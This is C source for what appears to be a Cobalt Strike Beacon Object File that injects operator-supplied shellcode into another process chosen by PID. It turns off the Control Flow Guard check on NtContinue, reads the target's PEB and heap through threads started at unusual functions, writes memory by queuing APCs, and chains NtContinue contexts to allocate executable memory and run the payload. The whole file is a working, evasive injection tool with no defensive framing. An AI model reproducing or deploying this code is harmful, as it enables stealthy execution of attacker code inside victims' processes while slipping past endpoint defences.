#ifndef _WIN64
#error This code must be compiled with a 64-bit version of MSVC
#endif

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
//#include <tlhelp32.h>
#include "beacon.h"
#include "dep.h"

//#pragma comment(lib, "advapi32.lib")
//#pragma comment(lib, "shell32.lib")
//#pragma comment(lib, "user32.lib")
//#pragma warning(disable : 4047)

PVOID CustomCopy(PVOID Destination, CONST PVOID Source, SIZE_T Length)
{
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}

VOID WINAPI CfgAddressAdd(ULONG_PTR ImageBase, ULONG_PTR Function, HANDLE hProc, int offset)
{
	CFG_CALL_TARGET_INFO    Cfg = { 0 };
	SIZE_T			        Len = { 0 };
	PIMAGE_NT_HEADERS       Nth = NULL;

	Nth = (PIMAGE_NT_HEADERS)RVA(PIMAGE_DOS_HEADER, ImageBase, ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
	Len = (Nth->OptionalHeader.SizeOfImage + 0x1000 - 1) & ~(0x1000 - 1);
	
	Cfg.Flags = CFG_CALL_TARGET_VALID;
	Cfg.Offset = Function - ImageBase;
	pSetProcessValidCallTargets FSetProcessValidCallTargets = (pSetProcessValidCallTargets)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernelbase.dll"), "SetProcessValidCallTargets");
	BOOL res = FSetProcessValidCallTargets(hProc, (PVOID)ImageBase, Len, offset, &Cfg);
	if (!res) {
		BeaconPrintf(CALLBACK_ERROR,"[X] Failed to disable CFG on NtContinue\n");
	}
};

LPVOID getPeb(HANDLE hProc, HMODULE module) {
	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)KERNEL32$GetProcAddress(module, "NtQueryInformationProcess");
	PROCESS_BASIC_INFORMATION info;
	MSVCRT$memset(&info, 0, sizeof(info));
	DWORD retLength;
	NTSTATUS status = NtQueryInformationProcess(hProc, ProcessBasicInformation, &info, sizeof(info), &retLength);
	return info.PebBaseAddress;
}

LPVOID RemoteAllocation(HANDLE hProc, LPVOID HeapAddr, int sizeofVal, HMODULE module) {
	LPVOID mallocc = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("msvcrt.dll"), "malloc");
	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)KERNEL32$GetProcAddress(module, "NtCreateThreadEx");
	pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)KERNEL32$GetProcAddress(module, "NtWaitForSingleObject");

	HANDLE hThread = NULL;
	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, mallocc, (PVOID)sizeofVal, FALSE, 0, 0, 0, NULL);
	NtWaitForSingleObject(hThread, FALSE, NULL);
	DWORD ExitCode = 0;
	KERNEL32$GetExitCodeThread(hThread, &ExitCode);
	DWORD64 heapAllocation = (0xFFFFFFFF00000000 & (INT64)HeapAddr) + ExitCode;
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] Heap Allocation: %p\n", heapAllocation);
	return (LPVOID)heapAllocation;
}

void WriteRemoteMemory(HANDLE hProc, LPVOID heapAllocation, int sizeofVal, unsigned char* buffer, HMODULE module) {
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote %i bytes\n", sizeofVal);
	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)KERNEL32$GetProcAddress(module, "NtCreateThreadEx");
	pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)KERNEL32$GetProcAddress(module, "NtQueueApcThread");
	pNtResumeThread NtResumeThread = (pNtResumeThread)KERNEL32$GetProcAddress(module, "NtResumeThread");
	pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)KERNEL32$GetProcAddress(module, "NtWaitForSingleObject");

	LPVOID RtlFillMemory = KERNEL32$GetProcAddress(module, "RtlFillMemory");
	LPVOID RtlExitUserThread = KERNEL32$GetProcAddress(module, "RtlExitUserThread");
	LPVOID RtlInitializeBitMapEx = KERNEL32$GetProcAddress(module, "RtlInitializeBitMapEx");

	HANDLE hThread2 = NULL;
	NtCreateThreadEx(&hThread2, THREAD_ALL_ACCESS, NULL, hProc, RtlExitUserThread, (PVOID)0x00000000, TRUE, 0, 0, 0, NULL);
	int alignmentCheck = sizeofVal % 16;
	int offsetMax = sizeofVal - alignmentCheck;
	int firCounter = 0;
	int eightCounter = 0;
	int secCounter = 0;
	int mod = 0;

	if (sizeofVal >= 16) {
		for (firCounter = 0; firCounter < offsetMax -1; firCounter = firCounter + 16) {
			char* heapWriter = (char*)heapAllocation + firCounter;
			NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlInitializeBitMapEx, (PVOID)heapWriter, (PVOID)*(ULONG_PTR*)((char*)buffer + firCounter + 8), (PVOID)*(ULONG_PTR*)((char*)buffer + firCounter));
		}
	}

	if (alignmentCheck >= 8) {	
		for (eightCounter = firCounter; (eightCounter + 8) < (firCounter + alignmentCheck -1); eightCounter = eightCounter + 8) {
			char* heapWriter = (char*)heapAllocation + eightCounter;
			NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlInitializeBitMapEx, (PVOID)heapWriter, NULL, (PVOID)*(ULONG_PTR*)((char*)buffer + eightCounter));
		}
		alignmentCheck -= 8;
	}

	if (alignmentCheck != 0 && alignmentCheck < 8) {

		if ((firCounter != 0 && eightCounter != 0) || (firCounter != 0 && eightCounter != 0)){
			secCounter = eightCounter;
			mod = eightCounter;
		}
		else if (firCounter != 0 && eightCounter == 0){
			secCounter = firCounter;
			mod = firCounter;
		}

		for (; secCounter < (mod + alignmentCheck); secCounter++) {
			char* heapWriter = (char*)heapAllocation + secCounter;
			NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlFillMemory, (PVOID)heapWriter, (PVOID)1, (PVOID)buffer[secCounter]);
		}
	}

	NtResumeThread(hThread2, NULL);
	NtWaitForSingleObject(hThread2, FALSE, NULL);
}

unsigned char* ReadRemoteMemory(HANDLE hProc, LPVOID addrOf, int sizeofVal, HMODULE module) {
    
	pRtlQueryDepthSList RtlQueryDepthSList = (pRtlQueryDepthSList)KERNEL32$GetProcAddress(module, "RtlQueryDepthSList");
	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)KERNEL32$GetProcAddress(module, "NtCreateThreadEx");
	pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)KERNEL32$GetProcAddress(module, "NtWaitForSingleObject");

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Read %i bytes\n", sizeofVal);
	unsigned char* readBytes = (unsigned char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 8);
	DWORD dwDataLength = sizeofVal;
	for (DWORD i = 0; i < dwDataLength; i = i + 2)
	{
		HANDLE hThread = NULL;
		NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, RtlQueryDepthSList, (ULONG_PTR*)((BYTE*)addrOf + i), FALSE, 0, 0, 0, NULL);
		DWORD ExitCode = 0;
		NtWaitForSingleObject(hThread, FALSE, NULL);
		KERNEL32$GetExitCodeThread(hThread, &ExitCode);
		if (dwDataLength - i == 1)
		{
			CustomCopy((char*)readBytes + i, (const void*)&ExitCode, 1);
		}
		else
		{
			CustomCopy((char*)readBytes + i, (const void*)&ExitCode, 2);
		}
	}
	return readBytes;
}

VOID InjectShellcode(HANDLE hProc, INT64 heapAddress, HMODULE module, char* sc_ptr, SIZE_T sc_len) {

	pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)KERNEL32$GetProcAddress(module, "NtQueueApcThread");
	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)KERNEL32$GetProcAddress(module, "NtCreateThreadEx");
	pNtResumeThread NtResumeThread = (pNtResumeThread)KERNEL32$GetProcAddress(module, "NtResumeThread");
	pNtContinue NtContinue = (pNtContinue)KERNEL32$GetProcAddress(module, "NtContinue");
	pNtTestAlert NtTestAlert = (pNtTestAlert)KERNEL32$GetProcAddress(module, "NtTestAlert");
	pNtGetContextThread NtGetContextThread = (pNtGetContextThread)KERNEL32$GetProcAddress(module, "NtGetContextThread");
	LPVOID RtlExitUserThread = KERNEL32$GetProcAddress(module, "RtlExitUserThread");
	LPVOID NTALLOC = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
	LPVOID wso = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "WaitForSingleObject");

	PCONTEXT            ContextRopAlloc = { 0 };
	PCONTEXT            ContextFake = { 0 };
	PCONTEXT            ContextExec = { 0 };
	PCONTEXT            ContextRopcpy = { 0 };

	ContextRopAlloc = (PCONTEXT)KERNEL32$LocalAlloc(LPTR, sizeof(CONTEXT));
	ContextExec = (PCONTEXT)KERNEL32$LocalAlloc(LPTR, sizeof(CONTEXT));
	ContextFake = (PCONTEXT)KERNEL32$LocalAlloc(LPTR, sizeof(CONTEXT));
	ContextRopcpy = (PCONTEXT)KERNEL32$LocalAlloc(LPTR, sizeof(CONTEXT));

	HANDLE fakeThread = NULL;
	NtCreateThreadEx(&fakeThread, THREAD_ALL_ACCESS, NULL, hProc, RtlExitUserThread, (PVOID)0x00000000, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL);
	ContextFake->ContextFlags = CONTEXT_FULL;

	NtGetContextThread(fakeThread, ContextFake);

	CustomCopy(ContextRopAlloc, ContextFake, sizeof(CONTEXT));
	ContextRopAlloc->ContextFlags = CONTEXT_FULL;
	CustomCopy(ContextRopcpy, ContextFake, sizeof(CONTEXT));
	ContextRopcpy->ContextFlags = CONTEXT_FULL;
	CustomCopy(ContextExec, ContextFake, sizeof(CONTEXT));
	ContextExec->ContextFlags = CONTEXT_FULL;

	PCONTEXT contextOfVirtualAlloc = (PCONTEXT)RemoteAllocation(hProc, (LPVOID)heapAddress, sizeof(CONTEXT), module);

	ContextRopAlloc->Rsp -= (ULONG_PTR)0x1000 * 9;
	ContextRopAlloc->Rip = (ULONG_PTR)NTALLOC;
	ContextRopAlloc->Rcx = (ULONG_PTR)0x00000000DDDD0000;
	ContextRopAlloc->Rdx = (ULONG_PTR)sc_len;
	ContextRopAlloc->R8 = (ULONG_PTR)MEM_COMMIT | MEM_RESERVE;
	ContextRopAlloc->R9 = (ULONG_PTR)PAGE_EXECUTE_READWRITE;

	WriteRemoteMemory(hProc, contextOfVirtualAlloc, sizeof(CONTEXT), (unsigned char*)ContextRopAlloc, module);
	WriteRemoteMemory(hProc, (PVOID)ContextRopAlloc->Rsp, sizeof(PVOID), (unsigned char*)&NtTestAlert, module);

	NtQueueApcThread(fakeThread, (PKNORMAL_ROUTINE)NtContinue, contextOfVirtualAlloc, NULL, NULL);


	PCONTEXT contextOfcpy = (PCONTEXT)RemoteAllocation(hProc, (LPVOID)heapAddress, sizeof(CONTEXT), module);

	ContextRopcpy->Rsp -= (ULONG_PTR)0x1000 * 8;
	ContextRopcpy->Rip = (ULONG_PTR)wso;
	ContextRopcpy->Rcx = (ULONG_PTR)(HANDLE)-1;
	ContextRopcpy->Rdx = (ULONG_PTR)10000;
	
	WriteRemoteMemory(hProc, contextOfcpy, sizeof(CONTEXT), (unsigned char*)ContextRopcpy, module);
	WriteRemoteMemory(hProc, (PVOID)ContextRopcpy->Rsp, sizeof(PVOID), (unsigned char*)&NtTestAlert, module);

	NtQueueApcThread(fakeThread, (PKNORMAL_ROUTINE)NtContinue, contextOfcpy, NULL, NULL);


	PCONTEXT contextOfExec = (PCONTEXT)RemoteAllocation(hProc, (LPVOID)heapAddress, sizeof(CONTEXT), module);

	ContextExec->Rsp -= (ULONG_PTR)0x1000 * 7;
	ContextExec->Rip = (ULONG_PTR)0x00000000DDDD0000;

	WriteRemoteMemory(hProc, contextOfExec, sizeof(CONTEXT), (unsigned char*)ContextExec, module);
	WriteRemoteMemory(hProc, (PVOID)ContextExec->Rsp, sizeof(PVOID), (unsigned char*)&NtTestAlert, module);

	NtQueueApcThread(fakeThread, (PKNORMAL_ROUTINE)NtContinue, contextOfExec, NULL, NULL);

	NtResumeThread(fakeThread, NULL);

	WriteRemoteMemory(hProc, (LPVOID)0x00000000DDDD0000, sc_len, sc_ptr, module);

	KERNEL32$LocalFree(ContextRopAlloc);
	KERNEL32$LocalFree(ContextExec);
	KERNEL32$LocalFree(ContextFake);
}

void go(char *args, int len) {   
	char* sc_ptr;
	SIZE_T sc_len; 
	DWORD pid;
	datap parser;
	HANDLE hProc = NULL;
	BeaconDataParse(&parser, args, len);
	pid = BeaconDataInt(&parser);
	sc_len = BeaconDataLength(&parser) - 4;
	sc_ptr = BeaconDataExtract(&parser, NULL);
	HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
	LPVOID NtContinue = (LPVOID)KERNEL32$GetProcAddress(hNtdll, "NtContinue");
	hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
	
	if (hProc == NULL){
		BeaconPrintf(CALLBACK_ERROR, "[X] OpenProcess Failed!\n");
		return;
	}

	CfgAddressAdd((ULONG_PTR)hNtdll, (ULONG_PTR)NtContinue, hProc, 0x1);
	KERNEL32$CloseHandle(hProc);
	hProc = NULL;
	hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	LPVOID PebAddr = getPeb(hProc, hNtdll);
	KERNEL32$CloseHandle(hProc);
	hProc = NULL;
	hProc = KERNEL32$OpenProcess(PROCESS_CREATE_THREAD, FALSE, pid);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Peb Address: 0x%p\n", PebAddr);
	INT64* HeapAddr = (INT64*)ReadRemoteMemory(hProc, (char*)PebAddr + 0x30, 8, hNtdll);
	INT64 readHeap = *HeapAddr;
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Heap Base Addr: %p\n", readHeap);

	InjectShellcode(hProc, readHeap, hNtdll ,sc_ptr, sc_len);

	KERNEL32$CloseHandle(hProc);
    
}
